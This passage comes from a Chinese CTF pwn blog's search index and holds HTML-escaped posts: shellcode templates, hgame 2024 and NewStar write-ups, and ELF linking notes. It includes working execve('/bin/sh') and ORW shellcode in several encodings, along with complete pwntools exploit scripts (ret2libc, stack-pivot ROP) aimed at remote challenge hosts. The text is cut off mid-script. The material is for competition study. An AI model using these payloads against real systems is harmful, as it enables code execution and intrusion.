&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;换源&#34;&gt;换源&lt;/h2&gt;
&lt;p&gt;三个[ ]分别对应 ld文件地址、glibc文件夹、题目文件&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;patchelf --set-interpreter [~/glibc-all-in-one/libs/2.26-0ubuntu2.1_amd64/ld-2.26.so] --set-rpath [~/glibc-all-in-one/libs/2.26-0ubuntu2.1_amd64] [./gundam]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;--set-rpath 后面的地址有时候需要加上 “ / ” 有时候不用&lt;/p&gt;
&lt;h3 id=&#34;原理&#34;&gt;原理&lt;/h3&gt;
&lt;p&gt;patchelf --set-rpath 的作用是 在ELF文件的 Dynamic section 的中添加一个 RUNPATH 段里面储存着动态链接库的绝对路径，即设置程序的动态链接库&lt;/p&gt;
&lt;p&gt;patchelf --set-interpreter 的作用是 在ELF文件的 interp section 设置 interpreter 项的值为 ld加载器绝对路径，即设置程序的动态链接库加载器&lt;/p&gt;
&lt;h4 id=&#34;学习链接&#34;&gt;学习链接&lt;/h4&gt;
&lt;p&gt;&lt;a href=&#34;https://sf2333.github.io/2022/02/19/PWN%E9%A2%98%E6%9C%AC%E5%9C%B0%E6%9B%B4%E6%8D%A2libc%E7%8E%AF%E5%A2%83%E6%94%BB%E7%95%A5/&#34;&gt;https://sf2333.github.io/2022/02/19/PWN题本地更换libc环境攻略/&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;onegadget&#34;&gt;Onegadget&lt;/h1&gt;
&lt;pre&gt;&lt;code&gt;one_gadget filename  #libc文件名
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;seccomp-tools&#34;&gt;seccomp-tools&lt;/h1&gt;
&lt;pre&gt;&lt;code&gt;export PATH=$PATH:/home/gg/.local/share/gem/ruby/3.1.0/bin
seccomp-tools dump ./vuln
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;shellcode&#34;&gt;shellcode&lt;/h1&gt;
&lt;h2 id=&#34;较短的shellcode&#34;&gt;较短的shellcode&lt;/h2&gt;
&lt;p&gt;i386（len = 18）&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;push   0xb
pop    eax
push   ebx
push   0x68732f2f
push   0x6e69622f
mov    ebx,esp
int    0x80
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;amd64（len = 22）&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;xor 	rsi,	rsi
push	rsi			
mov 	rdi,	0x68732f2f6e69622f
push	rdi
push	rsp
pop	rdi
mov 	al,	59
cdq
syscall
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;沙盒下最短shellcode&#34;&gt;沙盒下最短shellcode&lt;/h2&gt;
&lt;h3 id=&#34;64位&#34;&gt;64位&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;shellcode=&#39;&#39;&#39;
	xor rax, rax   #xor rax,rax是对rax的清零运算操作
	xor rdi, rdi   #清空rdi寄存器的值
	xor rsi, rsi   #清空rsi寄存器的值
	xor rdx, rdx
	mov rax, 2      #open调用号为2
	mov rdi, 0x67616c662f2e   #为galf/.为./flag的相反0x67616c662f2e为/flag的ASCII码的十六进制
	push rdi
	mov rdi, rsp
	syscall   #系统调用前，linux在eax寄存器里写入子功能号，断止处理程序根据eax寄存器的值来判断用户进程申请哪	类系统调用。
	mov rdx, 0x100   #sys_read(3,file,0x100)
	mov rsi, rdi
	mov rdi, rax
	mov rax, 0      #read调用号为0,0为文件描述符，即外部输入，例如键盘
	syscall
	mov rdi, 1      #sys_write(1,file,0x30)
	mov rax, 1      #write调用号为1,1为文件描述符，指的是屏幕
	syscall
&#39;&#39;&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;32位&#34;&gt;32位&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;shellcode = &amp;quot;&amp;quot;&amp;quot;
/*open(./flag)*/
	push 0x1010101
	xor dword ptr [esp], 0x1016660
	push 0x6c662f2e
	mov eax,0x5
	mov ebx,esp
	xor ecx,ecx
	int 0x80
	/*read(fd,buf,0x100)*/
	mov ebx,eax
	mov ecx,esp
	mov edx,0x30
	mov eax,0x3
	int 0x80
	/*write(1,buf,0x100)*/
	mov ebx,0x1
	mov eax,0x4
	int 0x80
&amp;quot;&amp;quot;&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;32位-2&#34;&gt;32位&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;b&#39;j\x0bXSh//shh/bin\x89\xe3\xcd\x80&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;push   0xb
pop    eax
push   ebx
push   0x68732f2f
push   0x6e69622f
mov    ebx,esp
int    0x80
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;64位-2&#34;&gt;64位&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;b&#39;H1\xf6VH\xbf/bin//shWT_\xb0;\x99\x0f\x05&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;xor 	rsi,	rsi
push	rsi
mov 	rdi,	0x68732f2f6e69622f
push	rdi
push	rsp	
pop	rdi	
mov 	al,	59	
cdq				
syscall
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;32位-短字节shellcode-21字节&#34;&gt;32位 短字节shellcode –&amp;gt; 21字节&lt;/h2&gt;
&lt;p&gt;\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x8&lt;/p&gt;
&lt;h2 id=&#34;32位-纯ascii字符shellcode&#34;&gt;32位 纯ascii字符shellcode&lt;/h2&gt;
&lt;p&gt;PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA&lt;/p&gt;
&lt;h2 id=&#34;32位-scanf可读取的shellcode&#34;&gt;32位 scanf可读取的shellcode&lt;/h2&gt;
&lt;p&gt;\xeb\x1b\x5e\x89\xf3\x89\xf7\x83\xc7\x07\x29\xc0\xaa\x89\xf9\x89\xf0\xab\x89\xfa\x29\xc0\xab\xb0\x08\x04\x03\xcd\x80\xe8\xe0\xff\xff\xff/bin/sh&lt;/p&gt;
&lt;h2 id=&#34;64位-scanf可读取的shellcode-22字节&#34;&gt;64位 scanf可读取的shellcode 22字节&lt;/h2&gt;
&lt;p&gt;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05&lt;/p&gt;
&lt;h2 id=&#34;64位-较短的shellcode-23字节&#34;&gt;64位 较短的shellcode 23字节&lt;/h2&gt;
&lt;p&gt;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&lt;/p&gt;
&lt;h2 id=&#34;64位-纯ascii字符shellcode&#34;&gt;64位 纯ascii字符shellcode&lt;/h2&gt;
&lt;p&gt;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&lt;/p&gt;
&lt;h1 id=&#34;orw&#34;&gt;ORW&lt;/h1&gt;
&lt;pre&gt;&lt;code&gt;fd = open(&#39;/flag&#39;,&#39;r&#39;)
read(fd,buf,len)
write(1,buf,len)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;fd一般为3，因为open返回的文件描述符是可用文件描述符中最小的那一个，打开一个文件自动打开0，1，2，对应着标准输入、标准输出、标准报错，所以read的文件描述符应该是3&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;openopen64函数&#34;&gt;open（open64）函数&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;int open(const char *path, int access, int mode);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;参数解释：&lt;/p&gt;
&lt;p&gt;path：要打开的文件路径和名称。&lt;/p&gt;
&lt;p&gt;access：访问模式，宏定义和含义如下：&lt;br&gt;
– O_RDONLY（0）：只读打开；&lt;br&gt;
– O_WRONLY（1）：只写打开；&lt;br&gt;
– O_RDWR（2）：读写打开；&lt;br&gt;
还可选择以下模式与以上3种基本模式相与：&lt;br&gt;
– O_CREAT（0x0100）创建一个文件并打开；&lt;br&gt;
– O_TRUNC（0x0200）打开一个已存在的文件并将文件长度设置为0，其他属性保持；&lt;br&gt;
– O_EXCL（0x0400）未使用；&lt;br&gt;
– O_APPEND（0x0800）追加打开文件；&lt;br&gt;
– O_TEXT（0x4000）打开文本文件翻译CR-LF控制字符；&lt;br&gt;
– O_BINARY（0x8000）打开二进制字符，不作CR-LF翻译；&lt;/p&gt;
&lt;p&gt;mode：该参数仅在access=O_CREAT方式下使用，其取值如下：&lt;br&gt;
– S_IFMT（0xF000）：文件类型掩码；&lt;br&gt;
– S_IFDIR（0x4000）：目录；&lt;br&gt;
– S_IFIFO（0x1000）：FIFO 专用；&lt;br&gt;
– S_IFCHR（0x2000）：字符专用；&lt;br&gt;
– S_IFBLK（0x3000）：块专用；&lt;br&gt;
– S_IFREG（0x8000）：只为0x0000；&lt;br&gt;
– S_IREAD（0x0100）：可读；&lt;br&gt;
– S_IWRITE（0x0080）：可写；&lt;br&gt;
– S_IEXEC（0x0040）：可执行；&lt;/p&gt;
&lt;h2 id=&#34;fopen函数&#34;&gt;fopen函数&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;**FILE *fopen(char *filename, char *mode);**
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;参数解释：&lt;/p&gt;
&lt;p&gt;– filename：文件名称。&lt;/p&gt;
&lt;p&gt;– mode：打开模式：&lt;br&gt;
r：只读方式打开一个文本文件（该文件必须存在）；&lt;br&gt;
r+：可读可写方式打开一个文本文件（该文件必须存在）；&lt;br&gt;
w：只写方式打开一个文本文件（若文件存在则文件长度清为0，即该文件内容会消失。若文件不存在则建立该文件）；&lt;br&gt;
w+：可读可写方式创建一个文本文件（若文件存在则文件长度清为零，即该文件内容会消失。若文件不存在则建立该文件）；&lt;br&gt;
a：追加方式打开一个文本文件（若文件不存在，则会建立该文件，如果文件存在，写入的数据会被加到文件尾，即文件原先的内容会被保留。（EOF符保留））；&lt;br&gt;
a+：可读可写追加方式打开一个文本文件（若文件不存在，则会建立该文件，如果文件存在，写入的数据会被加到文件尾后，即文件原先的内容会被保留。 （原来的EOF符不保留））；&lt;br&gt;
rb：只读方式打开一个二进制文件（使用法则同r）；&lt;br&gt;
rb+：可读可写方式打开一个二进制文件（使用法则同r+）；&lt;br&gt;
wb：只写方式打开一个二进制文件（使用法则同w）；&lt;br&gt;
wb+：可读可写方式生成一个二进制文件（使用法则同w+）；&lt;br&gt;
ab：追加方式打开一个二进制文件（使用法则同a）；&lt;br&gt;
ab+：可读可写方式追加一个二进制文件（使用法则同a+）；&lt;br&gt;
返回参数： 文件顺利打开后，指向该流的文件指针就会被返回。若果文件打开失败则返回NULL，并把错误代码存在errno 中。一般而言，打开文件后会作一些文件读取或写入的动作，若打开文件失败，接下来的读写动作也无法顺利进行，所以在fopen()后请作错误判断及处理。&lt;/p&gt;
&lt;h3 id=&#34;区别&#34;&gt;区别：&lt;/h3&gt;
&lt;p&gt;前者属于低级IO，后者是高级IO。 前者返回一个文件描述符，后者返回一个文件指针。 前者无缓冲，后者有缓冲。 前者与 read, write 等配合使用， 后者与 fread, fwrite等配合使用。 后者是在前者的基础上扩充而来的，在大多数情况下，用后者。&lt;/p&gt;
&lt;h2 id=&#34;write函数&#34;&gt;write函数&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;ssize_t write(int fd, const void *buf, size_t count);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;fd：要操作的文件的文件描述符，通过open函数打开文件时获取。&lt;/p&gt;
&lt;p&gt;buf：指定写入数据对应的缓冲区，可以将需要的写入的内容存放到buf中，再将其写入文件里。&lt;/p&gt;
&lt;p&gt;count：指定写入的字节数，单位是字节。&lt;/p&gt;
&lt;p&gt;返回值：如果写操作顺利完成，则会返回写入的字节数；如果返回值为0，则表示未向文件中写入任何字符；如果写入出错，则会返回-1。&lt;/p&gt;
&lt;h3 id=&#34;一般来说&#34;&gt;一般来说&lt;/h3&gt;
&lt;p&gt;fd=1时标准输出，fd=文件fd时输出到文件&lt;/p&gt;
&lt;h2 id=&#34;read函数&#34;&gt;read函数&lt;/h2&gt;
&lt;p&gt;C语言中，&lt;code&gt;read&lt;/code&gt;函数是用于从文件描述符中读取数据的函数，其原型如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#include &amp;lt;unistd.h&amp;gt;
ssize_t read(int fd, void *buf, size_t count);
&lt;/code&gt;&lt;/pre&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;fd&lt;/code&gt;：文件描述符，指定要读取的文件或套接字的标识符。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;buf&lt;/code&gt;：指向存储读取数据的缓冲区的指针。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;count&lt;/code&gt;：要读取的最大字节数。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;code&gt;read&lt;/code&gt;函数的返回值是实际读取的字节数。如果返回值为0，表示已到达文件末尾；如果返回值为-1，表示读取出错。&lt;/p&gt;
&lt;p&gt;需要注意的是，&lt;code&gt;read&lt;/code&gt;函数是一个阻塞函数，当没有数据可读时，它会一直等待直到有数据可读或出现错误。如果需要*非阻塞读取数据**，可以使用&lt;code&gt;select&lt;/code&gt;或&lt;code&gt;poll&lt;/code&gt;等函数进行操作。&lt;/p&gt;
&lt;h3 id=&#34;一般来说-2&#34;&gt;一般来说&lt;/h3&gt;
&lt;p&gt;fd=0时标准输入，fd=文件fd时读取文件&lt;/p&gt;
&lt;h3 id=&#34;fd描述符&#34;&gt;fd描述符&lt;/h3&gt;
&lt;p&gt;0，1，2 这三个 fd 值已经被赋予特殊含义，分别是标准输入（ STDIN_FILENO ），标准输出（ STDOUT_FILENO ），标准错误（ STDERR_FILENO ）&lt;/p&gt;
">换libc源，一些shellcode模板，orw</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/hgame-2024week-1bu-fen-wp/"" data-c="
          &lt;h1 id=&#34;ezshellcode&#34;&gt;ezshellcode&lt;/h1&gt;
&lt;p&gt;查看文件逻辑，发现mmap函数，打开了可执行权限&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1707274301403.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;v4是无符号整型，在长度判断时强行转化为了int类型和10进行比较，可以通过输入-1绕过长度判断&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1707274316891.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;发现对shellcode有字符限制，在网上可以找到可见字符shellcode，exp如下&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

p = remote(&amp;quot;47.100.245.185&amp;quot;,30806)
#p = process(&#39;./vuln&#39;)
elf = ELF(&#39;./vuln&#39;)

p.sendline(&amp;quot;-1&amp;quot;)
pay = &amp;quot;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&amp;quot;
p.sendafter(&#39;input your shellcode:&#39;,pay)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;elden-random-challenge&#34;&gt;&lt;strong&gt;Elden Random Challenge&lt;/strong&gt;&lt;/h1&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1707274331253.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;查看逻辑是对比99个伪随机数，随机数种子也给出，所以&lt;/p&gt;
&lt;p&gt;创建一个c语言文件&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;time.h&amp;gt;
void set_seed() 
{
	srand(time(0LL));
}
int random_number() 
{    
	return rand();
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;将其编译为一个动态链接库&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;gcc -shared -o 1.so 1.c
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;绕过随机数判断后就是一个栈溢出，攻击思路如下：&lt;/p&gt;
&lt;p&gt;1.泄露puts函数实际地址，从而泄露libc基地址&lt;/p&gt;
&lt;p&gt;2.根据基地址找到system函数和/bin/sh字符串&lt;/p&gt;
&lt;p&gt;3.控制系统执行system函数&lt;/p&gt;
&lt;p&gt;exp如下&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
import ctypes

context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,log_level=&#39;debug&#39;)

lib = ctypes.CDLL(&#39;./1.so&#39;)

p = remote(&amp;quot;47.100.245.185&amp;quot;,32620)
#p = process(&#39;./random&#39;)
elf = ELF(&#39;./random&#39;)
libc = ELF(&#39;./libc.so.6&#39;)

lib.random_number.restype = ctypes.c_int

lib.set_seed()

p.sendafter(&amp;quot;name.&amp;quot;,b&amp;quot;aaaaaaaa&amp;quot;)

i = 0
while i&amp;lt;=98:
	b = lib.random_number()  
	t = b % 100 + 1
	print(&amp;quot;t = &amp;quot;,t)              
	p.sendafter(b&#39;number:\n&#39;,p64(t))
	i += 1

puts_plt=elf.plt[&#39;puts&#39;]
puts_got=elf.got[&#39;puts&#39;]
main_addr=0x40125D
pop_rdi_ret=0x401423
ret=0x40101a

payload = b&#39;a&#39;*56+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main_addr)
p.sendafter(&amp;quot;mind.\n&amp;quot;,payload)

puts_addr=u64(p.recvuntil(&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&#39;\x00&#39;))
print(hex(puts_addr))

#libc_base = puts_addr - libc.symbols[&#39;puts&#39;]
#system_addr = libc_base + libc.symbols[&#39;system&#39;]
#bin_addr = libc_base + next(libc.search(b&#39;/bin/sh&#39;))

libc_base = puts_addr - 0x084420
system_addr = libc_base + 0x052290
bin_addr = libc_base + 0x1B45BD

print(&amp;quot;base = &amp;quot;,hex(libc_base))
print(&amp;quot;sys = &amp;quot;,hex(system_addr))
print(&amp;quot;bin = &amp;quot;,hex(bin_addr))

#gdb.attach(p)
payload=b&#39;b&#39;*56+p64(ret)+p64(pop_rdi_ret)+p64(bin_addr)+p64(system_addr)
p.send(payload)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;elden-ring-i&#34;&gt;&lt;strong&gt;Elden Ring Ⅰ&lt;/strong&gt;&lt;/h1&gt;
&lt;p&gt;起初，以为只是一个简简单单的ret2libc，泄露puts实际地址然后直接调用system函数取得shell，但是一顿操作后动态调试发现进入system函数了，但是产生了SIGSYS信号，没有成功取得shell，当时觉得非常玄学，经学习，发现可以通过seccomp工具查看函数执行权限，所以看看怎么个事，发现execve函数被禁用（樂），并且栈溢出长度有点短，所以栈迁移打orw&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;4&#34;&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1707274350884.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;比赛期间写的exp本地能输出编写的flag，但是远端却一直打不通（又一玄学问题），结束后看了wp，发现wp中的函数偏移还有libc文件中的Gadgets偏移都和我的不一样，查看后发现附件中的libc文件各个偏移都和wp一样，程序链接的是先前安装的libc.so.6文件（难崩），改下偏移成功打通&lt;/p&gt;
&lt;p&gt;exp如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

io = remote(&amp;quot;106.15.72.34&amp;quot;,31549)
#io = process(&#39;./vuln&#39;)
elf = ELF(&#39;./vuln&#39;)

puts_plt=elf.plt[&#39;puts&#39;]
puts_got=elf.got[&#39;puts&#39;]
main_addr=0x401292
pop_rdi_ret=0x4013e3
ret=0x40101a
vuln = 0x40125B

payload = b&#39;a&#39;*0x108+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(vuln)
io.sendafter(&amp;quot;accord.\n\n&amp;quot;,payload)

puts_addr=u64(io.recvuntil(&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&#39;\x00&#39;))
print(hex(puts_addr))

#libc_base = puts_addr - libc.sym[&#39;puts&#39;]

libc_base = puts_addr - 0x084420
print(&amp;quot;base = &amp;quot;,hex(libc_base))

rdi = 0x4013e3
rsi = libc_base + 0x2601f
rdx = libc_base + 0x119211
rsp = libc_base + 0x2f70a

read_real=libc_base+0x10DFC0

open_real=libc_base+0x10DCE0

write_real=libc_base+0x10E060

bss_addr = 0x404090
pop_rax_ret = 0x36174 + libc_base
#gdb.attach(io)

### read_bss
bss_base=0x404090

# read(int fd, void *buf, size_t count);
fd=0
buf=bss_base+0x100
count=0x200

payload=b&#39;a&#39;*0x108+p64(rsi)+p64(buf)+p64(read_real)+p64(rsp)+p64(buf+8)
io.send(payload)
 
### rop-&amp;gt;bss
payload=b&#39;./flag&#39;.ljust(8,b&#39;\x00&#39;)

# open(const char *pathname, int flags)
pathname_ptr=buf
flags=0
payload+=p64(rdi)+p64(pathname_ptr)+p64(rsi)+p64(flags)+p64(open_real)


# read(int fd, void *buf, size_t count);
fd=3
buf2=buf+0x300
count=0x100
payload+=p64(rdi)+p64(fd)+p64(rsi)+p64(buf2)+p64(rdx)+p64(count)+p64(0)+p64(read_real)


# write(int handle,void* buf,int length)
handle=1
buf3=buf2
length=0x50
payload+=p64(rdi)+p64(1)+p64(rsi)+p64(buf3)+p64(rdx)+p64(length)+p64(0)+p64(write_real)+p64(vuln)

io.sendafter(&amp;quot;accord.\n\n&amp;quot;,payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
"> hgame 2024(week 1)部分wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/han-jia-xue-xi/"" data-c="
          &lt;h1 id=&#34;程序员的自我修养阅读笔记一&#34;&gt;程序员的自我修养阅读笔记(一)&lt;/h1&gt;
&lt;pre&gt;&lt;code&gt;gcc -E 1.c -o 1.i         //-E表示只进行预编译，-o=-output
gcc -S 1.c -o 1.s         //编译
gcc -c 1.s -o 1.o         //汇编
gcc -c 1.c                //-c表示只编译不链接
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;elf文件开头的十六个字节魔数&#34;&gt;ELF文件开头的十六个字节(魔数)&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;7f(DEL) 45(&#39;E&#39;) 4c(&#39;L&#39;) 46(&#39;F&#39;) 02(ELF文件类型) 01(字节序) 01(ELF文件版本号) 00 00 00 00 00 00 00 00 00

ELF文件类型：0x1:32位   0x2:64位

字节序：0x1:小端序    0x2:大端序

ELF版本号：一般都是0x1
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;elf中的段&#34;&gt;ELF中的段&lt;/h2&gt;
&lt;h3 id=&#34;data&#34;&gt;.data&lt;/h3&gt;
&lt;p&gt;已初始化的全局变量和局部变量&lt;/p&gt;
&lt;h3 id=&#34;bss&#34;&gt;.bss&lt;/h3&gt;
&lt;p&gt;未初始化的全局变量&lt;/p&gt;
&lt;h3 id=&#34;common&#34;&gt;COMMON&lt;/h3&gt;
&lt;p&gt;未初始化的静态变量和初始化为0的全局变量或静态变量（只是为未初始化的全局变量和局部静态变量预留位置，所以在文件中不占据空间）&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1706330239149.png&#34; alt=&#34;1706330239149&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h2 id=&#34;静态库&#34;&gt;静态库&lt;/h2&gt;
&lt;h3 id=&#34;静态库的构造&#34;&gt;静态库的构造&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;gcc -c 1.c 2.c                //只编译这两个文件
ar ecs libvector.a 1.o 2.o    //将这两个文件链接到libvector.a的静态库中
ae -t libvector.a             //查看链接库存在的成员
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;链接静态库&#34;&gt;链接静态库&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;gcc -c main.c                                //只编译main.c文件
gcc -static -o prog mian.o ./libvector.a     //将静态库libvector.a链接到main.o中
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;静态库的解析过程&#34;&gt;静态库的解析过程&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;ar ecs libvector.a 1.o 2.o
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;a href=&#34;https://www.bilibili.com/video/BV1oS4y1T7Uf/?p=49&amp;amp;spm_id_from=pageDriver&#34;&gt;【CSAPP-深入理解计算机系统】7-5. 静态库的解析过程_哔哩哔哩_bilibili&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;动态库&#34;&gt;动态库&lt;/h2&gt;
&lt;h3 id=&#34;动态库的构造&#34;&gt;动态库的构造&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;gcc -shared -fpic -o libvector.so 1.c 2.c   //-shared指示创建一个共享的目标文件，-fpic指示生成位置无关的代码(为了使共享库可以加到内存的任意位置)
gcc -o prog2 main.c ./libvector.so  //使用这个库构建可执行程序
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;pwn&#34;&gt;pwn&lt;/h1&gt;
&lt;h2 id=&#34;newstarweek1&#34;&gt;NEWSTAR(week1)&lt;/h2&gt;
&lt;h3 id=&#34;random&#34;&gt;random&lt;/h3&gt;
&lt;p&gt;程序运用了伪随机数，所以需要利用ctypes库在python代码中调用C语言函数，步骤如下：&lt;/p&gt;
&lt;p&gt;1.创建一个C语言源代码文件，假设名为1.c&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;time.h&amp;gt;
void set_seed() 
{
	time_t seed = time(NULL);
	srand(seed);
}
int random_number() 
{    
	return rand();
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;2.将其编译为一个动态链接库&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;gcc -shared -o 1.so 1.c
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;exp如下（可能一次过不了，多试几次就行）&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
import ctypes

#context.log_level = &#39;debug&#39;

# 加载动态链接库
lib = ctypes.CDLL(&#39;./1.so&#39;)

# 由于题目是在&amp;quot;2$031&amp;quot;中随机组成system函数的参数，
# 推测当参数为$0、$1...时可以getshell,所以多次尝试

sh = process(&#39;./pwn&#39;)

lib.random_number.restype = ctypes.c_int

# 调用C语言的set_seed函数
lib.set_seed()

# 调用C语言的random_number函数
result = lib.random_number()

# 发送我们的答案
sh.recvuntil(b&amp;quot;?\n&amp;quot;)
sh.sendline(str(result).encode(&#39;utf-8&#39;))

sh.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;shellcode&#34;&gt;shellcode&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;payload = asm(shellcraft.sh())
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;newstarweek2&#34;&gt;NEWSTAR(week2)&lt;/h2&gt;
&lt;h3 id=&#34;ret2libc&#34;&gt;ret2libc&lt;/h3&gt;
&lt;p&gt;通过puts函数泄露函数真正地址，从而泄露libc版本&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

p = process(&#39;./ret2libc&#39;)
elf = ELF(&#39;./ret2libc&#39;)
#libc=ELF(&#39;./libc.so.6&#39;)

puts_plt=elf.plt[&#39;puts&#39;]
puts_got=elf.got[&#39;puts&#39;]
main_addr=0x400698
pop_rdi_ret=0x400763
ret=0x4006F1

payload=b&#39;a&#39;*40+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main_addr)
p.sendline(payload)

puts_addr=u64(p.recvuntil(&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&#39;\x00&#39;))
print(hex(puts_addr))

# 题目给出libc时
# libc_base   = puts_addr - libc.symbols[&#39;puts&#39;]
# system_addr = libc_base + libc.symbols[&#39;system&#39;]
